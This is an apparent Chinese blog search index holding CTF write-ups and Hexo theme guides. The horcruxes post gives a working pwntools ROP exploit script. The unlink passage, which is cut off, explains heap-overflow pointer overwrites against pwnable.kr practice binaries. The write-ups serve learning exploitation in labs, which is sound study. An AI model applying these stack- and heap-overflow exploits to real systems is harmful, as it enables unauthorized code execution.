<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[horcruxes-pwnable.kr]]></title>
    <url>%2Fhorcruxes-pwnable.kr%2F</url>
    <content type="text"><![CDATA[前言这题考的是ROP系统攻击。百度百科是这样介绍的： 简介：ROP全称为Return-oriented Programming（面向返回的编程）。是一种基于代码复用的攻击技术，攻击者从已有的库或可执行文件中提取指令片段，构建恶意代码。 内在特征：1. ROP控制流中，call和ret指令不操纵函数，而是用于将函数里面的短指令序列的执行流串起来，但在正常的程序中，call和ret分别代表函数的开始和结束；2. ROP控制流中，jmp指令在不同的库函数甚至不同的库之间跳转，攻击者抽取的指令序列可能取自任意一个二进制文件的任意一个位置，这很不同于正常程序的执行。比如，函数中部提取出的jmp短指令序列，可将控制流转向其他函数的内部；而正常程序执行的时候，jmp指令通常在同一函数内部跳转。 防范措施：ROP攻击的程序主要使用栈溢出的漏洞，实现程序控制流的劫持。因此栈溢出漏洞的防护是阻挡ROP攻击最根源性的方法。如果解决了栈溢出问题，ROP攻击将会在很大程度上受到抑制。 总结ROP就是主要利用栈溢出，操纵call、ret、jmp指令，实现程序控制流的劫持，跳转到任意一个位置。 题目ssh horcruxes@pwnable.kr -p2222 (pw:guest) 题目只给了程序，没有给源码，那就放ida或gdb查看。程序保护只有NX（不能在栈上运行） readme里面主要是告诉我们，编译好的程序运行在机子的9032端口，运行用户是horcruxes-pwn。 本地运行需要安装32位libseccomp库：apt-get install libseccomp-dev:i386 审计 图中ida截图部分函数名被替换及注释 main函数里面有大量的seccomp函数，查了一下是linux的沙箱之类的，这里看不懂是什么操作就先略过。welcome_borad里面是输出提示语段； 重点来看看init_ABCDEFG()！首先从/dev/urandom里面读取4byte到buf。然后利用buf作为种子生成7个随机数，根据公式运算得到ABCDEFG的值。其中sum为7个数字之和。 初始化7个数后，main函数调用函数ropme()。函数伪C如下。 第一次（第8 9行）我们输入值与生成的7个数对比，如果相同则调用对应的函数。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253int ropme()&#123; char s[100]; // [esp+4h] [ebp-74h] int v2; // [esp+68h] [ebp-10h] int fd; // [esp+6Ch] [ebp-Ch] printf("Select Menu:"); __isoc99_scanf("%d", &amp;v2); getchar(); if ( v2 == a ) &#123; A(); &#125; else if ( v2 == b ) &#123; B(); &#125; else if ( v2 == c ) &#123; C(); &#125; else if ( v2 == d ) &#123; D(); &#125; else if ( v2 == e ) &#123; E(); &#125; else if ( v2 == f ) &#123; F(); &#125; else if ( v2 == g ) &#123; G(); &#125; else &#123; printf("How many EXP did you earned? : "); gets(s); if ( atoi(s) == sum ) &#123; fd = open("flag", 0); s[read(fd, s, 0x64u)] = 0; puts(s); close(fd); exit(0); &#125; puts("You'd better get more experience to kill Voldemort"); &#125; return 0;&#125; 这里我们审查A()函数，其余6个数大同小异。 当调用A()时，函数返回一段字符串，其中包含a的初始值。 我们在反观ropme()函数，我们第二次（第41行）的值，与sum对比（7个数之和），如果相同则打印出flag。 思路在ropme()下的第41行gets()可以造成栈溢出，结合题目提示：这是一题rop攻击的例题。 思路一利用gets()造成栈溢出覆盖ropme()返回地址，将地址覆盖为函数中的第44行，也就是flag。 程序只开启了NX，我们也不是利用shellcode，看上去是可行的。但是实测，无法返回到ropme()的任何一行。查看溢出覆盖后ropme()的返回地址为非预期地址。谷歌一圈发现是： 0xa会被gets当作输入结束的信号(回车)，并且把0xa替换成0x00(\0)，最终导致没办法直接返回到ropme()函数中去。 思路二就是把生成的7个值都找出来求和一下就可以了。这里我一开始就踩了坑，看到init_ABCDEFG()在生成随机时，种子是从/dev/urandom中读取的，然后就天真认为每次生成的7个值都是一样的，实际上人家不是伪随机数QAQ。我们利用这个脚本，再次验证一样（虽然事实如此）： 12345678910111213from pwn import *context.log_level = 'debug'payload = 'a'*120 + p32(0x809fe4b)for _ in range(5): p = remote('pwnable.kr',9032) p.recvuntil('Select Menu:') p.sendline('1') p.recvuntil('earned? : ') p.sendline(payload) p.recvuntil('(EXP +') sleep(3) 也就是说我们需要一次性得到7个随机数。我们看下A()汇编代码： A()汇编中的retn相当于pop eip、pop cs，即pop eip之后，执行eip指向的指令。 我们是通过覆盖了ropme()的返回地址为A()。也就是说A()的返回地址则是ropme()返回地址+4。我们用一个图描述一下： 利用这一点，只用我们依次覆写7个函数的地址，就能自动读取到EXP。 那么现在的问题就变成了，如何返回到ropme()函数。前面我们已经得知了，因为ropme()内存地址特殊，无法跳转，但是ropme()是在main()函数中被调用过的，那么我们可以跳转到main()函数中的这一行。 脚本12345678910111213141516171819202122232425262728# coding:utf-8# 不明原因需要多运行几次直到flag出来from pwn import *context.log_level = 'debug'payload = 'a'*(0x74+4) # s到eip上距离# ABCDEFG调用地址payload += p32(0x809FE4B)+p32(0x809FE6A)+p32(0x809FE89)+p32(0x809FEA8)+p32(0x809FEC7)+p32(0x809FEE6)+p32(0x809FF05)# ropme调用地址payload += p32(0x0809FFFC)p = remote('pwnable.kr',9032)p.recvuntil('Select Menu:')p.sendline('1')p.recvuntil('earned? : ')p.sendline(payload)exp = 0for _ in range(7): p.recvuntil('(EXP +') exp += int(p.recvline().replace(')',"").strip())print expp.recvuntil('Select Menu:')p.sendline('1')p.recvuntil('earned? : ')p.sendline(str(exp))p.recv() 总结 ROP通常利用栈溢出，操纵call、ret、jmp指令，实现程序控制流的劫持，跳转到任意一个位置。 gets()结束输入的标记是0xa(回车)，并将其替换为\0。 参考muirelle pwnable.kr horcruxes ROP利用]]></content>
      <categories>
        <category>pwn</category>
        <category>pwnable.kr</category>
      </categories>
      <tags>
        <tag>pwnable.kr</tag>
        <tag>pwn</tag>
        <tag>ROP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexo博客与Next主题的高级应用]]></title>
    <url>%2FHexo%E5%8D%9A%E5%AE%A2%E4%B8%8ENext%E4%B8%BB%E9%A2%98%E7%9A%84%E9%AB%98%E7%BA%A7%E5%BA%94%E7%94%A8%2F</url>
    <content type="text"><![CDATA[[TOC]站点优化首页显示文章摘要主题默认设置，首页将会显示每一篇文章的全文，如果想只显示文章摘要，可以在主题配置文件（/themes/next/_config.yml）中这样修改：1234# 自动摘要提取设定auto_excerpt: enable: true length: 150 # 摘要长度用户可以在文章中使用&lt;!--more--&gt;标记来精确划分摘要信息，标记之前的堕落将作为摘要显示在首页。 如果文章的Front-Matter(文章开头的配置信息）中有非空的description字段，则该字段的内容会被作为摘要显示。 修改站点页脚在主题配置文件中修改网站页脚信息： 1234567891011121314footer: # 底部信息区 since: 2018 # 建站时间 icon: name: heart # 图标名称 animated: true # 开启动画 color: &quot;#ff0000&quot; # 图标颜色 powered: enable: true # 显示由 Hexo 强力驱动 version: false # 隐藏 Hexo 版本号 theme: enable: true # 显示所用的主题名称 version: false # 隐藏主题版本号 修改网站 FaviconFavicon 即浏览器标签左侧的图标。下载自己喜欢的图标置于 themes\next\source\images\ 目录下，命名方式参考主题配置文件中的 favicon 字段。 12345favicon: small: /images/favicon-16x16-next.png # 小图标 medium: /images/favicon-32x32-next.png # 大图标 apple_touch_icon: /images/apple-touch-icon-next.png # 苹果图标 safari_pinned_tab: /images/logo.svg # safari浏览器标签页图标 添加社交链接用户可以在主题配置文件中根据样例提示添加个人社交软件链接： 12345678910111213141516social: GitHub: https://github.com/yourname || github E-Mail: mailto:yourname@gmail.com || envelope Weibo: https://weibo.com/yourname || weibo Google: https://plus.google.com/yourname || google Twitter: https://twitter.com/yourname || twitter FB Page: https://www.facebook.com/yourname || facebook VK Group: https://vk.com/yourname || vk StackOverflow: https://stackoverflow.com/yourname || stack-overflow YouTube: https://youtube.com/yourname || youtube Instagram: https://instagram.com/yourname || instagram Skype: skype:yourname?call|chat || skypesocial_icons: enable: true # 显示社交软件图标 icons_only: false # 显示图标的同时显示文字 站点添加版权协议在主题配置文件中设置相关字段并选择知识共享协议： 1creative_commons: by-nc-sa 文章底部添加版权信息在目录/next/layout/_macro/添加my-copyright.swig： 1`&#123;% if page.copyright %&#125;&lt;div class="my_post_copyright"&gt; &lt;script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"&gt;&lt;/script&gt; &lt;!-- JS库 sweetalert 可修改路径 --&gt; &lt;script type="text/javascript" src="http://jslibs.wuxubj.cn/sweetalert_mini/jquery-1.7.1.min.js"&gt;&lt;/script&gt; &lt;script src="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"&gt;&lt;/script&gt; &lt;link rel="stylesheet" type="text/css" href="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css"&gt; &lt;p&gt;&lt;span&gt;本文标题:&lt;/span&gt;&lt;a href="&#123;&#123; url_for(page.path) &#125;&#125;&gt;&#123;&#123; page.title &#125;&#125;/a&gt;&lt;/p&gt; &lt;p&gt;&lt;span&gt;文章作者:&lt;/span&gt;&lt;a href="/" title="访问 &#123;&#123; theme.author &#125;&#125;的个人博客"&gt;&#123;&#123; theme.author &#125;&#125;/a&gt;&lt;/p&gt; &lt;p&gt;&lt;span&gt;发布时间:&lt;/span&gt;&#123;&#123; page.date.format("YYYY年MM月DD日 - HH:MM") &#125;&#125;/p&gt; &lt;p&gt;&lt;span&gt;最后更新:&lt;/span&gt;&#123;&#123; page.updated.format("YYYY年MM月DD日 - HH:MM") &#125;&#125;/p&gt; &lt;p&gt;&lt;span&gt;原始链接:&lt;/span&gt;&lt;a href="&#123;&#123; url_for(page.path) &#125;&#125; title="&#123;&#123; page.title &#125;&#125;&gt;&#123;&#123; page.permalink &#125;&#125;/a&gt; &lt;span class="copy-path" title="点击复制文章链接"&gt;&lt;i class="fa fa-clipboard" data-clipboard-text="&#123;&#123; page.permalink &#125;&#125; aria-label="复制成功！"&gt;&lt;/i&gt;&lt;/span&gt; &lt;/p&gt; &lt;p&gt;&lt;span&gt;许可协议:&lt;/span&gt;&lt;i class="fa fa-creative-commons"&gt;&lt;/i&gt; &lt;a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)"&gt;署名-非商业性使用-禁止演绎 4.0 国际&lt;/a&gt; 转载请保留原文链接及作者。&lt;/p&gt; &lt;/div&gt;&lt;script&gt; var clipboard = new Clipboard(.fa-clipboard); clipboard.on(success, $(function()&#123; $(".fa-clipboard").click(function()&#123; swal(&#123; title: "", text: 复制成功, html: false, timer: 500, showConfirmButton: false &#125;); &#125;); &#125;)); &lt;/script&gt;&#123;% endif %&#125;` 在目录next/source/css/_common/components/post/下添加my-post-copyright.styl： 123456789101112131415161718192021222324252627282930313233343536373839404142434445.my_post_copyright &#123; width: 85%; max-width: 45em; margin: 2.8em auto 0; padding: 0.5em 1.0em; border: 1px solid #d3d3d3; font-size: 0.93rem; line-height: 1.6em; word-break: break-all; background: rgba(255,255,255,0.4);&#125;.my_post_copyright p&#123;margin:0;&#125;.my_post_copyright span &#123; display: inline-block; width: 5.2em; color: #b5b5b5; font-weight: bold;&#125;.my_post_copyright .raw &#123; margin-left: 1em; width: 5em;&#125;.my_post_copyright a &#123; color: #808080; border-bottom:0;&#125;.my_post_copyright a:hover &#123; color: #a3d2a3; text-decoration: underline;&#125;.my_post_copyright:hover .fa-clipboard &#123; color: #000;&#125;.my_post_copyright .post-url:hover &#123; font-weight: normal;&#125;.my_post_copyright .copy-path &#123; margin-left: 1em; width: 1em; +mobile()&#123;display:none;&#125;&#125;.my_post_copyright .copy-path:hover &#123; color: #808080; cursor: pointer;&#125; 修改next/layout/_macro/post.swig，在代码 12345&lt;div&gt; &#123;% if not is_index %&#125; &#123;% include wechat-subscriber.swig %&#125; &#123;% endif %&#125;&lt;/div&gt; 之前添加增加如下代码： 12345&lt;div&gt; &#123;% if not is_index %&#125; &#123;% include my-copyright.swig %&#125; &#123;% endif %&#125;&lt;/div&gt; 修改next/source/css/_common/components/post/post.styl文件，在最后一行增加代码： 1@import "my-post-copyright" 如果要在该博文下面增加版权信息的显示，需要在 Markdown 中增加copyright: true的设置，类似： 1234567---title: date: tags: categories: copyright: true--- 修改菜单及创建分类页修改主题配置文件下的menu，按需打开菜单。 123456789menu: home: / || home about: /about/ || user tags: /tags/ || tags categories: /categories/ || th archives: /archives/ || archive #schedule: /schedule/ || calendar sitemap: /sitemap.xml || sitemap #commonweal: /404/ || heartbeat 虽然现在站点已经有分页，但是仍然不能打开。因为只有了入口，但还没有标签页面，需要在命令行输入如下命令：hexo new page tags新建出标签页。 同样的道理，开启分类页的时候要输入hexo new page categories来新建出分类页。 添加顶部加载条根目录打开命令行，输入如下命令： 1git clone https://github.com/theme-next/theme-next-pace themes/next/source/lib/pace 然后主题配置文件搜索pace字段，修改pace: false为pace: true即可开启加载条功能，修改下方的pace-theme字段还可以修改加载条的样式。 123456pace: enable: true # Themes list: # big-counter | bounce | barber-shop | center-atom | center-circle | center-radar | center-simple # corner-indicator | fill-left | flat-top | flash | loading-bar | mac-osx | material | minimal theme: mac-osx 添加动态背景根目录打开命令行，输入： 1git clone https://github.com/theme-next/theme-next-canvas-nest themes/next/source/lib/canvas-nest 主题配置文件搜索canvas-nest字段，enable项设置为true。 1234567891011canvas_nest: enable: false # 是否在手机端显示。 onmobile: true # Display on mobile or not # 线条颜色, 默认: `'0,0,0'`；三个数字分别为(R,G,B) color: "0,0,255" # RGB values, use `,` to separate # 线条透明度（0~1）, 默认: `0.5 opacity: 0.5 # The opacity of line: 0~1 zIndex: -1 # z-index property of the background # count`: 线条的总数量, 默认: `150` count: 99 # The number of lines 增加回到顶部按钮及显示当前浏览进度主题配置文件搜索b2t字段，将b2t字段的false修改为true即可，（注意此功能只能用于Pisces和Gemini主题）。 1234567# 返回顶部按钮back2top: enable: true # Back to top in sidebar. sidebar: true # Scroll percent label in b2t button. scrollpercent: true 为博客加上萌萌的首先安装插件，根目录命令行输入npm install --save hexo-helper-live2d主题配置文件或者博客配置文件最下方添加如下代码： 注意：实测了一下在主题配置文件下用比较好使，但是官方文档中说明在博客配置文件中也可以，可能我配置有问题。 12345678910111213141516live2d: enable: true scriptFrom: local pluginRootPath: live2dw/ pluginJsPath: lib/ pluginModelPath: assets/ tagMode: false debug: false model: use: live2d-widget-model-&lt;模型名&gt; display: position: right width: 150 height: 300 mobile: show: true 修改模型，参考live2d-widget-models目前可用的模型如下： 12345678910111213141516171819202122live2d-widget-model-chitoselive2d-widget-model-epsilon2_1live2d-widget-model-gflive2d-widget-model-haru/01 (use npm install --save live2d-widget-model-haru)live2d-widget-model-haru/02 (use npm install --save live2d-widget-model-haru)live2d-widget-model-harutolive2d-widget-model-hibikilive2d-widget-model-hijikilive2d-widget-model-izumilive2d-widget-model-koharulive2d-widget-model-mikulive2d-widget-model-ni-jlive2d-widget-model-nicolive2d-widget-model-nietzschelive2d-widget-model-nipsilonlive2d-widget-model-nitolive2d-widget-model-shizukulive2d-widget-model-tororolive2d-widget-model-tsumikilive2d-widget-model-unitychanlive2d-widget-model-wankolive2d-widget-model-z16 增加本地搜索功能首先安装插件，根目录命令行输入 1npm install hexo-generator-searchdb --save 编辑博客配置文件，新增以下内容到任意位置： 1`search: path: search.xml field: post format: html limit: 10000` 主题配置文件搜索local_search字段，设置enable为true 1`# Local searchlocal_search: enable: true` 配置完成后保存，hexo g、hexo s查看。 404页面原来的主题没有404页面，加一个也不是什么难事。首先在/source/目录下新建一个404.md，内容如下： 1234567---title: 404date: 2019-07-19 16:41:10type: "404"layout: "404"description: "你来到了没有知识的荒原 :("--- 然后在/themes/matery/layout/目录下新建一个404.ejs文件，内容如下： 1234567891011121314151617181920212223&lt;style type="text/css"&gt; /* don't remove. */ .about-cover &#123; height: 75vh; &#125;&lt;/style&gt;&lt;div class="bg-cover pd-header about-cover"&gt; &lt;div class="container"&gt; &lt;div class="row"&gt; &lt;div class="col s10 offset-s1 m8 offset-m2 l8 offset-l2"&gt; &lt;div class="brand"&gt; &lt;div class="title center-align"&gt; 404 &lt;/div&gt; &lt;div class="description center-align"&gt; &lt;%= page.description %&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;/div&gt; 在网站底部加上访问量打开\themes\next\layout\_partials\footer.swig文件,在copyright前加上画红线这句话： 文章页面优化修改文章目录导航取消数字编号在主题配置文件中关闭目录中的数字编号： 1`toc: number: false # 关闭目录中的数字编号` 修改文章meta信息默认主题配置中，标题下方会显示文章的创建时间、文章的修改时间、文章分类信息等元数据，用户可以在主题配置文件中自定义设置需要显示的 meta 元信息： 1234567post_meta: item_text: true # 显示文字说明 created_at: true # 显示文章创建时间 updated_at: enabled: false # 隐藏文章修改时间 another_day: true # 只有当修改时间和创建时间不是同一天的时候才显示 categories: false # 隐藏分类信息 设置代码高亮主题NexT 使用 Tomorrow Theme作为代码高亮，共有5款主题供你选择。 NexT 默认使用的是 白色的 normal 主题，可选的值有 normal，night， night blue， night bright， night eighties 更改 主题配置文件中的highlight_theme 字段，将其值设定成你所喜爱的高亮主题即可。 全站及文章字数统计及阅读时长根目录执行： 1npm install hexo-symbols-count-time --save 博客配置文件底部添加如下内容，保存。 1`symbols_count_time: symbols: true time: true total_symbols: true total_time: true` 参考文章基础搭建Yearito’s Blog 超详细Hexo+Github博客搭建小白教程 进阶设置这应该是最全的hexo博客搭建以及next美化教程 Github Pages + Hexo 博客搭建，Next主题个性化修改 Hexo-NexT配置超炫网页效果(主要配置leancloud) Hexo-Next搭建个人博客（添加统计访客量以及文章阅读量） LeviDing 的博客 hexo的next主题个性化教程:打造炫酷网站]]></content>
  </entry>
  <entry>
    <title><![CDATA[Hexo博客搭建&Next主题安装]]></title>
    <url>%2FHexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%26Next%E4%B8%BB%E9%A2%98%E5%AE%89%E8%A3%85%2F</url>
    <content type="text"><![CDATA[新建一个Github仓库首先在 GitHub 新建一个仓库（Repository），名称为 {username}.github.io，注意这个名比较特殊，必须要是 github.io为后缀结尾的。比如GitHub用户名叫test，那我就新建一个test.github.io，新建完成之后就可以进行后续操作了。（这里省略配置本地git环境，具体请谷歌。主要内容是配置SSH连接） 安装环境安装Node.js首先在电脑上安装Node.js，下载地址在这里，可以安装Stable版本。安装完毕后，确定环境变量配置好。在cmd中输入npm --version显示版本，即配置成功。 安装HexoHexo相当于博客的底层框架。Hexo提供命令行工具，用于快速创建项目、页面、编译和部署Hexo博客。安装命令如下： 1npm install -g hexo-cil 初始化博客先在本地新一个文件夹，作为blog的源码以及生成的静态网页存储的地方。进入文件夹，右键选择git bash here。 首先使用命令新建项目： 1hexo init &#123;name&#125; 等待完成过后，文件夹下出现hexo的初始化文件，文件结构如下： 123456789101112131415.├── node_modules //依赖安装目录├── scaffolds //模板文件夹，新建的文章将会从此目录下的文件中继承格式| ├── draft.md //草稿模板| ├── page.md //页面模板| └── post.md //文章模板├── source //资源文件夹，用于放置图片、数据、文章等资源| └── _posts //文章目录├── themes //主题文件夹| └── landscape //默认主题├── .gitignore //指定不纳入git版本控制的文件├── _config.yml //站点配置文件├── db.json ├── package.json└── package-lock.json 使命命令让Hexo编译生成HTML代码： 1hexo g 使用命令让网站在本地运行：(在本地4000端口上查看博客) 1hexo s 部署接下来我们先将这个初始化的博客部署到Github Pages上面验证一下其可用性。成功之后我们在进行其他操作。 在部署之前，我们需要修改本地文件夹中根目录下的_config.yml。找到Deloyment，将你自己的仓库连接地址填入，然后选择master分支。修改后文件参考： 123456# Deployment## Docs: https://hexo.io/docs/deployment.htmldeploy: type: git repo: &#123;将这里含&#123;&#125;替换为你的仓库地址&#125; branch: master 还需要额外安装一个支持GIT的部署插件，才能拿顺利部署到github上面： 1npm install hexo-deployer-git --save 完成准备工作后，执行部署命令： 1hexo d 接收到INFO Deploy done: git信息后，blog就成功部署到github page上面，直接访问你的仓库URL就能打开你的blog了，内容与在本地生成的一模一样。 这里注意一点：在仓库master中的内容是本地目录下的public的内容。也就是说hexo把编译后的静态页面内容上传到github的master分支上面。 如何将博客源码放到github上，我们在后面的高级应用再说。 配置站点基本信息站点基本信息配置文件在根目录的_config.yml中保存。找到site区域，这里可以配置站点标题、副标题等等信息： 123456# Sitetitle: 这是站点标题subtitle: 这是站点副标题description: 这是站点描述keywords: "这是站点关键字"author: 这是站点作者 另外还可以设置一下语言，如果要设置为汉语的话可以将 language 的字段设置为 zh-CN，修改如下： 1language: zh-CN 到这里就配置完站点的基本信息，其他参数请参看官方说明，然后按需修改。 修改主题接下来，我们就来安装Next主题。主题的github地址。 在本地博客文件夹的根目录下，clone主题仓库： 1git clone https://github.com/theme-next/hexo-theme-next themes/next 执行完毕后，next主题源码就会出现在thems/next。 然后需要修改hexo中的主题选项设置，也就是我们需要修改根目录下的_config.yml文件，将theme的参数修改为next： 1theme: next 重新打开blog，就能看到加载的新主题了。 主题配置样式Next主题提供了4种细分风格样式，通过修改/theme/next/_config.yml文件中的scheme参数选择： 1234# scheme: Muse#scheme: Mistscheme: Pisces#scheme: Gemini faviconfavicon就是站点标签栏的小图标，默认使用Hexo的小图标。可以利用这个网站，将图片转化为站点小图标，图标保存在/themes/next/source/images下面。 然后在主题配置文件中配置favicon选项，把一些相关路径配置后，刷新网页图标就会被刷新。 12345favicon: small: /images/favicon-16x16.png medium: /images/favicon-32x32.png apple_touch_icon: /images/apple-touch-icon.png safari_pinned_tab: /images/safari-pinned-tab.svg avateravatar 就是类似于站点的头像，如果设置了这个，会在站点的作者信息旁边额外显示一个头像。 将头像保存在/themes/next/source/images/，然后在主题_config.yml文件下编辑avatar的配置，填入头像的路径即可。 12345678910# Sidebar Avataravatar: # In theme directory (source/images): /images/avatar.gif # In site directory (source/uploads): /uploads/avatar.gif # You can also use other linking images. url: /images/avatar.png # If true, the avatar would be dispalyed in circle.(是否以圆形显示) rounded: true # If true, the avatar would be rotated with the cursor.（是否开启旋转效果） rotated: true 文章现在整个站点只有一篇文章，那么我们怎样来增加其他的文章呢？ 这个很简单，只需要调用 Hexo 提供的命令即可，比如我们要新建一篇「HelloWorld」的文章，命令如下： 1hexo new hello-world 创建的文章会出现在 source/_posts 文件夹下，是 MarkDown 格式。 在文章开头通过如下格式添加必要信息： 123456789101112---title: 标题 # 自动创建，如 hello-worlddate: 日期 # 自动创建，如 2019-09-22 01:47:21tags: - 标签1- 标签2- 标签3categories:- 分类1- 分类2--- 开头下方撰写正文，MarkDown 格式书写即可。]]></content>
      <tags>
        <tag>Hexo</tag>
        <tag>Next</tag>
        <tag>Blog</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[unlink - pwnable.kr]]></title>
    <url>%2Funlinked-pwnable%2F</url>
    <content type="text"><![CDATA[预习知识什么是unlinkedunlinked 是堆溢出中的一种常见形式，通过将双向列表中的空闲块拿出来与将要free的物理相邻的块进行合并。（将双向链表上的chunk卸载下来与物理chunk合并）unlink漏洞条件有3个以上的空闲chunk链表，其中最前面的chunk存在有堆溢出unlink的触发 当使用free函数释放正在使用的chunk时，会相应地检查其相邻的chunk是否空闲。如果空间则将相邻的chunk与free的chunk进行合并。 unlink有两个安全检测机制，都是针对chunk的header部分。 prev_size:记录上一chunk的大小 size:记录当前chunk的大小 fd:在链表中指向下一个空闲chunk bk:在链表中指向上一个空闲chunk 判断一 1if(chunksize (p) != prev_size (next_chunk (p))) 此判断所代表的含义为检查将从链表中卸下的chunk其size是否被恶意的修改。记录当前size的地方有两处一个是为当前chunk的size字段和下一个chunk(物理地址上相邻的高地址的chunk)的prev_size字段如果这两个字段的值不等，则unlink会抛出异常。 判断二 1if(__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, 0)) 这是检查当前chunk的前面一个chunk的bk、后面一个chunk的fd是否指向当前chunk，如果有其中之一不符合，则unlink会抛出异常。 unlink解链原理 FD=P-&gt;fd即当前空闲chunk所指向的下一个空闲chunk BK=P-&gt;bk即当前空闲chunk所指向的上一个chunk FD-&gt;bk=BK&lt;=&gt;P-&gt;fd-&gt;bk= P-&gt;bk BK-&gt;fd=FD&lt;=&gt;P-&gt;bk-&gt;fd= P-&gt;fdunlink引发漏洞原理Dword shoot一种漏洞溢出技巧。漏洞是在双向链表chunk删除时，出现的一种漏洞类型。在进行双向链表的操作过程中，有溢出等的情况下，删除的chunk的fd、bk两个指针被恶意的改写的话，就会在链表删除的时候发生的漏洞。 unlink 卸载chunk时，会对chunk 的fd、bk指针进行操作，就是因为这个操作我们可以利用堆溢出控制，进行unlink的chunk的fd、bk指针。 如果双向链表的2个指针被修改的话，一般由于修改数据，或者控制程序的跳转。shellcode无法放入这么小的空间中。 题目123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;typedef struct tagOBJ&#123; struct tagOBJ* fd; struct tagOBJ* bk; char buf[8];&#125;OBJ;void shell()&#123; system("/bin/sh");&#125;void unlink(OBJ* B)&#123; OBJ* BK; OBJ* FD; BK=B-&gt;bk;FD=B-&gt;fd; FD-&gt;bk=BK;BK-&gt;fd=FD; //[B-&gt;bk]-&gt;fd被B-&gt;fd值覆写 //[B-&gt;fd]-&gt;bk被B-&gt;bk覆写&#125;int main(int argc, char* argv[])&#123; malloc(1024); OBJ* A = (OBJ*)malloc(sizeof(OBJ)); OBJ* B = (OBJ*)malloc(sizeof(OBJ)); OBJ* C = (OBJ*)malloc(sizeof(OBJ)); // double linked list: A &lt;-&gt; B &lt;-&gt; C A-&gt;fd = B; B-&gt;bk = A; B-&gt;fd = C; C-&gt;bk = B; printf("here is stack address leak: %p\n", &amp;A); printf("here is heap address leak: %p\n", A); printf("now that you have leaks, get shell!\n"); // heap overflow! gets(A-&gt;buf); // exploit this unlink! unlink(B); return 0;&#125; 概述一下程序运行思路：申请ABC三个大小为0x10的chunk；将ABC之间相互串联起来，形成一个空闲chunk链表（链接方式看下图）。接着答应出chunk A的栈地址、堆地址。之后从A buf后写入我们输入的数据，对B调用unlink函数，将B在链表上卸载下来。 思路最明显的一点就是get(A-&gt;buf)存在堆溢出的情况。结合题目给予我们的提示：unlink。存在溢出和有unlink出现，我们就能构造出两个任意指向的指针（fd、bk）。 我们先来看看unlink函数： 1234567891011void unlink(OBJ* B)&#123; OBJ* BK; OBJ* FD; BK=B-&gt;bk; FD=B-&gt;fd; FD-&gt;bk=BK; BK-&gt;fd=FD; //[B-&gt;bk]-&gt;fd被B-&gt;fd值覆写 //[B-&gt;fd]-&gt;bk被B-&gt;bk覆写&#125; 我们先来解读一下unlink是怎么释放一个chunk的。我们就用下图中堆块解释： 我们先将四条转换方程式化简一下： 12B-&gt;fd-&gt;bk = B-&gt;bkB-&gt;bk-&gt;fd = B-&gt;fd B-&gt;bk = 0x1030；B-&gt;fd = 0x1010；都是存储着内存地址的变量。换句话说就是B-&gt;bk B-&gt;fd都是地址值。 B-&gt;fd-&gt;bk = *((B-&gt;fd)+bk) =*(0x1010+4)；B-&gt;bk-&gt;fd = *((B-&gt;bk)+fd) = *(0x1030+0)；可以看见现在变成了指针，而不是上面的地址值，而是一个指针。 那么最后的运算结果是： 12*(0x1010+4) = 0x1030//0x1014（前一个chunk的bk）的值被覆盖为0x1010*(0x1030+0) = 0x1010//0x1030（后一个chunk的fd）的值被覆盖为0x1010 unlink之后的chunk指针就如同最下行所示。 我们初定的利用思路是：利用unlink和堆溢出，创造出两个所我们所控制的任意指针，然后将程序控制流控制到shell上。将shellcode写到堆上，然后覆盖返回指针到堆上的方法不可行。因为程序开启了NX，堆栈上数据不能运行。而且程序中也有现成的shell。 做到这里就有点进行不下去，主要是不知覆盖那个函数的返回地址，来控制程序流。查看别人writeup，发现关键点在这里： retn retn指令作用是栈顶字单元出栈，其赋值给EIP寄存器，只要能够修改ESP寄存器的内容修改为shellcode的地址就能执行shellcode。 lea esp,[ecx-4] lea指令将存储器操作数mem的4位16进制偏移地址送到指定的寄存器。eg：SI=1000H，执行指令 LEA BX , [SI] 后，BX=1000H。也就是说esp的值来自[ecx-4]指向的值 。 leave leave指令相当于mov esp ebp，pop ebp，对esp数据的来源无影响。 mov ecx,[ebp+var_4]相当于mov ecx,[ebp-4] ecx等于[ebp-4]指向的值，也就是我们需要将[ebp-4]指向的值修改为shellcode+4 还记得我们已经分析得到的条件：可以利用堆溢出和unlind创造出两个指针。（ebp的值在程序运行时值不变） 我们就将其中的一个任意指针修改为*(ebp-4)，将ebp-4的值覆写为shellcode+4。 那我们先找出shellcode 和 ebp的内存地址： IDA函数表中找到shellcode地址： 程序会将chunk A的栈地址和堆地址，而栈地址是用ebp计算偏移得到的。IDA中查看chunk A栈地址的偏移算法： chunk A stack addr = ebp+var_14 = ebp - 0x14 从这里就可以推算出ebp - 0x4 相对于的chunk A 栈地址的相对位置，进而推算出实际内存地址。 shellcode的地址，我们需要找一个地址放置。方便我们构建的任意地址指针读取到ebp-0x4中。那么，我们就一齐写入到chunk A 堆中。 接下来就是看看构造指针的fd、bk需要填入什么数。unlink 的计算方程： 12345B-&gt;bk-&gt;fd = B-&gt;fdB-&gt;fd-&gt;bk = B-&gt;bk*(0x1030+0) = 0x1010//0x1030（后一个chunk的fd）的值被覆盖为0x1010 *(0x1010+4) = 0x1030//0x1014（前一个chunk的bk）的值被覆盖为0x1010 我们利用第一个指针进行写入，也就是：*(bk+0)=fd。换而言之就是*(ebp-4)=shellcode-4。 得出我们需要填入的是fd = chunk A堆地址+12；bk = chunk A栈地址 + 0x10 初始情况下的chunk A : data A on heap: ——————————— &lt;=A | FD | BK | ——————————— &lt;=A-&gt;buf , A+0x8 | put shellcode here | | length of buf is 0x8 | ——————————— | presizeB | sizeB | ——————————— &lt;=B , A+0x8+0x8+0x8 | FD | BK | ——————————— &lt;=B-&gt;buf | | ——————————— 